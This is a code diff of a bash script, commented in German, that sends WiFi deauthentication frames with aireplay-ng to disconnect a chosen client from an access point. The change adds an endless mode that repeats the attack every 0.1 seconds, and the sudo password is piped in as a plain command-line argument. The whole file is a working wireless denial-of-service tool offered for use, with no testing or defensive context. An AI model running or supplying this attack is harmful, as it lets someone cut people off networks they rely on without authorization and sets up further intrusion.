@@ -1,50 +1,45 @@
 #!/bin/bash
-
 set -x
 
-INTERFACE="$1"       # z.B. wlan0
-AP_MAC="$2"          # BSSID des AP, z.B. AA:BB:CC:DD:EE:FF
-CLIENT_MAC="$3"      # MAC des Clients, z.B. 11:22:33:44:55:66
-CHANNEL="$4"         # Kanal, z.B. 36
-PACKETS="${5:-100}"  # Anzahl Deauth-Pakete, Default 100
-SECRET="$6"          # sudo-Passwort
-
-
-echo "Interface: $INTERFACE"
-echo "AP MAC: $AP_MAC"
-echo "Client MAC: $CLIENT_MAC"
-echo "Channel: $CHANNEL"
-echo "Packets: $PACKETS"
-echo "Secret: $SECRET"
-
+# -----------------------------------------------------------------------------
+# 0) Parameter prüfen
+# -----------------------------------------------------------------------------
+INTERFACE="$1"       # wlan0
+AP_MAC="$2"
+CLIENT_MAC="$3"
+PACKETS="$4"         # 0 → infinite, sonst Anzahl
+CHANNEL="$5"
+SECRET="$6"
 
 if [[ -z "$INTERFACE" || -z "$AP_MAC" || -z "$CLIENT_MAC" || -z "$CHANNEL" || -z "$SECRET" ]]; then
-echo "Usage: $0  <ap_mac> <client_mac>  [packets] "
-exit 1
+  echo "Usage: $0 <interface> <ap_mac> <client_mac> <packets:0=infinite> <channel> <secret>"
+  exit 1
 fi
-
 
 if ! ip link show "$INTERFACE" &>/dev/null; then
-echo "Interface $INTERFACE nicht gefunden"
-exit 1
+  echo "Interface $INTERFACE nicht gefunden"
+  exit 1
 fi
 
-
-#echo "[i] Deaktiviere Interface $INTERFACE"
-#echo "$SECRET" | sudo -S ip link set "$INTERFACE" down###
-
-#echo "[i] Setze Monitor-Mode auf $INTERFACE"
-#echo "$SECRET" | sudo -S iw dev "$INTERFACE" set type monitor 
-#echo "$SECRET" | sudo -S ip link set "$INTERFACE" up#
-
-echo "[i] Deaktiviere Energiesparen"
+echo "[i] Energiesparen aus"
 echo "$SECRET" | sudo -S iw dev "$INTERFACE" set power_save off || true
 
-echo "[i] Setze Interface $INTERFACE auf Kanal $CHANNEL"
-echo "$SECRET" | sudo -S iwconfig "$INTERFACE" channel "$CHANNEL" 
+echo "[i] Kanal setzen: $CHANNEL"
+echo "$SECRET" | sudo -S iwconfig "$INTERFACE" channel "$CHANNEL"
 sleep 1
 
-echo "[i] Sende $PACKETS Deauth-Pakete von $CLIENT_MAC an $AP_MAC auf Kanal $CHANNEL"
-echo "$SECRET" | sudo -S aireplay-ng -0 "$PACKETS" -a "$AP_MAC" -c "$CLIENT_MAC" "$INTERFACE"
+# -----------------------------------------------------------------------------
+# 4) Deauth-Pakete senden
+# -----------------------------------------------------------------------------
+if [[ "$PACKETS" -eq 0 ]]; then
+  echo "[i] Starte infinite Client-Deauth von $CLIENT_MAC ↔ $AP_MAC"
+  while true; do
+    echo "$SECRET" | sudo -S aireplay-ng -0 1 -a "$AP_MAC" -c "$CLIENT_MAC" "$INTERFACE"
+    sleep 0.1
+  done
+else
+  echo "[i] Sende $PACKETS Deauth-Pakete von $CLIENT_MAC an $AP_MAC"
+  echo "$SECRET" | sudo -S aireplay-ng -0 "$PACKETS" -a "$AP_MAC" -c "$CLIENT_MAC" "$INTERFACE"
+fi
 
 exit 0
